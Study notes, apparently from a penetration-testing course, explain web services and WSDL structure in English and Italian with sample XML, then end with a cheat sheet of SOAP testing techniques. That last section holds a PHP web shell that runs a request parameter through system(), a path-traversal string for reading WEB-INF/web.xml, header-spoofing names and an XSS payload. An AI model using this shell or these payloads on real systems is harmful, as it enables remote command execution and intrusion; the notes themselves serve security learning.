


```
### Topic OverView:
+ Introduction To Web Services
+ Web Service Implementations
+ WSDL Language Fundamentals
+ Web Service Security Testing
+ SOAP Web Service Security Testing



### Learning Objectives:
+ You will have a solid understanding of what web services are, how they work and how they differ from traditional APIs and web applications.
+ You will have an understanding of the different types of Web Service implementations (XML-RPC, SOAP, REST etc) and how they work.
+ You will have an understanding of the WSDL language and how it is used to describe the functionality of web services.
+ You will have an understanding of how to methodologically test a SOAP based web service for common vulnerabilities.
+ You will be able to find and identify WSDL files to discover methods and operations pertinent to the web service.
+ You will be able to invoke hidden methods and test web services for common vulnerabilities like SQL injection and command injection.


```

```
### Web Services


## Web Services vs Web Applications:

# Web Services:
● Web services are designed to facilitate communication and data
exchange between different software systems over the internet.

● They provide a standardized way for different applications to interact with each other, often using protocols like SOAP (Simple Object Access Protocol) or REST (Representational State Transfer).

● Web services are typically used for machine-to-machine communication and are not meant for direct human interaction.

● No user interface, Exchange structured, Protocols like SOAP, REST, XML-RPC, JSON-RPC.




# Web Applications:
● Web applications are software programs that are accessed through a web browser and are designed to perform specific tasks or provide services directly to end-users.

● They are meant for human interaction and can range from simple
websites to complex web-based applications like email clients, social media platforms, or online shopping sites.

● User interface, HTTP/HTTPS.




## Web Services vs API:
- Web Services:
● Web services are a broad category of technologies and protocols
designed to facilitate communication and data exchange betweenb different software systems over the internet. They are meant to provide a standardized way for various applications, often on different platforms and using different programming languages, to interact with each other.

- API:
● APIs (Application Programming Interfaces), on the other hand, refer to a set of rules, protocols, and tools that allow different software applications to communicate with each other. They provide access to the functionality or data of an application or service for developers to use in their own applications.




### WSDL:
WSDL which stands for Web Services Description Language, is an XML-based language used to describe the functionality and interface of a web service.


## WSDL - Documents:
● A WSDL document is typically created to describe a SOAP-based web service. It defines the service's operations, their input and output message structures, and how they are bound to the SOAP protocol.

● The WSDL document effectively documents the API provided by the
service.

● The WSDL document serves as a contract between the service provider and consumers. It specifies how clients should construct SOAP requests to interact with the service. This contract defines the operations, their input parameters, and expected responses.




## WSDL - Components:


● Definition:
L'elemento root di tutti i file WSDL. All'interno della definizione viene specificato il nome del servizio Web, vengono dichiarati tutti gli spazi dei nomi utilizzati nel documento WSDL e vengono definiti tutti gli altri elementi del servizio.



● Types: la sezione <types> definisce i tipi di dati utilizzati nel servizio Web. In genere include XML Schema Definitions (XSD) che specificano la struttura e i vincoli dei dati di input e output.

Es.
<wsdl:types>
<xs:schema attributeFormDefault="qualified" elementFormDefault="qualified" targetNamespace="http://ws.xxx.accor.it">
<xs:import namespace="http://beans.xxx.accor.it/xsd"/>
<xs:element name="operazioneOnline">
<xs:complexType>
<xs:sequence>
<xs:element minOccurs="0" name="idTerminale" nillable="true" type="xs:string"/>
<xs:element minOccurs="0" name="datiOperazioneOriginale" nillable="true"
</xs:sequence>
</xs:complexType>
</xs:element>





● Message: l'elemento <message> definisce le strutture dati utilizzate nei messaggi scambiati tra il client e il servizio. I messaggi possono avere più parti, ciascuna con un nome e una definizione di tipo che fa riferimento ai tipi definiti nella sezione <types>.

Es.
<wsdl:message name="operazioneOnlineRequest">
<wsdl:part name="parameters" element="ns:operazioneOnline"/>
</wsdl:message>
<wsdl:message name="operazioneOnlineResponse">
<wsdl:part name="parameters" element="ns:operazioneOnlineResponse"/>
</wsdl:message>





● PortType: l'elemento <portType> descrive le operazioni supportate dal servizio Web. Ogni operazione corrisponde a un metodo o una funzione che un client può invocare. Specifica i messaggi di input e output per ciascuna operazione.
Definisce le operazioni di input e output supportate dal servizio Web. In altre parole, attraverso l' elemento message , i messaggi da scambiare vengono definiti e presentati come un intero documento o come argomenti da mappare all'invocazione di un metodo.

Es.
<wsdl:portType name="WSTransazioniCardPortType">
<wsdl:operation name="invioTrx">
</wsdl:operation>
<wsdl:operation name="operazioneOnline">
<wsdl:input message="ns:operazioneOnlineRequest" wsaw:Action="urn:operazioneOnline"/>
<wsdl:output message="ns:operazioneOnlineResponse" wsaw:Action="urn:operazioneOnlineResponse"/>
</wsdl:operation>
<wsdl:operation name="validaPan">
</wsdl:operation>
</wsdl:portType>





● Binding: l'elemento <binding> specifica il modo in cui le operazioni del servizio sono legate a un particolare protocollo, ad esempio SOAP su HTTP. Definisce dettagli come il protocollo, la codifica dei messaggi e gli indirizzi degli endpoint.

Es. 
<wsdl:binding name="WSTransazioniCardSoap11Binding" type="ns:WSTransazioniCardPortType">
<soap:binding transport="http://schemas.xmlsoap.org/soap/http" style="document"/>
<wsdl:operation name="operazioneOnline">
</wsdl:operation>
<wsdl:operation name="invioTrx">
</wsdl:operation>
<wsdl:operation name="validaPan">
</wsdl:operation>
</wsdl:binding>




● Service: l'elemento <service> fornisce informazioni sul servizio stesso. Include il nome del servizio e l'indirizzo dell'endpoint, ovvero l'URL da cui i client possono accedere al servizio.

 Es.
<wsdl:service name="WSTransazioniCard">
<wsdl:port name="WSTransazioniCardHttpSoap11Endpoint" binding="ns:WSTransazioniCardSoap11Binding">
<soap:address location="http://example/services/WSTransazioniCard.WSTransazioniCardHttpSoap11Endpoint/"/>
</wsdl:port>

POST http://example.net/services/WSTransazioniCard.WSTransazioniCardHttpSoap11Endpoint/




● Operation: l'oggetto operazione definito all'interno di un tipo di porta rappresenta un'azione specifica che un servizio può eseguire. Specifica il nome dell'operazione, la struttura del messaggio di input, la struttura del messaggio di output e, facoltativamente, i messaggi di errore che possono verificarsi durante l'operazione.

Es.
<wsdl:operation name="operazioneOnline">
<wsdl:input message="ns:operazioneOnlineRequest" wsaw:Action="urn:operazioneOnline"/>
<wsdl:output message="ns:operazioneOnlineResponse" wsaw:Action="urn:operazioneOnlineResponse"/>
</wsdl:operation>


```


```
### Web Services - General HTB

Fuzzing wsdl:
- /example.wsdl
- ?wsdl
- /example.disco
- ?disco
DISCO is a Microsoft technology for publishing and discovering Web Services.


Fuzzing directory:
- ?xsd=../../WEB-INF/web.xml


- Spoofing SOAP Action

- Command Injection

- Http Header Poisoning:
> HTTP_X_FORWARDED_FOR
> X-Forwarded-For
> X-Forwarded-IP 


- File Upload:
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
Il tipo di contenuto è stato impostato automaticamente su application/x-php, il che significa che non è presente alcuna protezione. Il tipo di contenuto verrebbe probabilmente impostato su application/octet-streamo text/plainse ce n'era uno.


- Fuzzing Common API:
Seclist file: /Discovery/Web-Content/common-api-endpoints-mazen160.txt


- XSS:
%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
<script>alert(document.domain)</script>


```